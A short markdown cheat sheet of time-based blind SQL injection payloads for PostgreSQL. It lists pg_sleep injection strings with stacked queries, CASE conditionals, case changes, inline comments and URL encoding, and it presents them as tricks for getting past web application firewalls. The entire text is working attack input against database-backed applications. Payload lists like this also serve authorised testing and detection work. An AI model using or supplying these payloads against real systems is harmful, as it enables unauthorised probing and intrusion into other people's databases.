# PostgreSQL

These payloads cause time delays to prove interaction via injection. Variations include case changes, comments, encodings (URL, double URL, Unicode), inline spaces/comments, and WAF bypass tricks like nested functions or heavy computations.

- **' AND pg_sleep(5) --**  
  Standard PG_SLEEP 5 seconds.
- **'; pg_sleep(5) --**  
  Semicolon stacked PG_SLEEP.
- **' AND (CASE WHEN 1=1 THEN pg_sleep(5) ELSE 0 END) --**  
  CASE conditional PG_SLEEP.
- **' aNd Pg_SlEeP(5) --**  
  Case variation PG_SLEEP.
- **'/*comment*/AND/*comment*/pg_sleep(5) --**  
  Inline comments PG_SLEEP.
- **%27%20AND%20pg_sleep(5)%20--**  
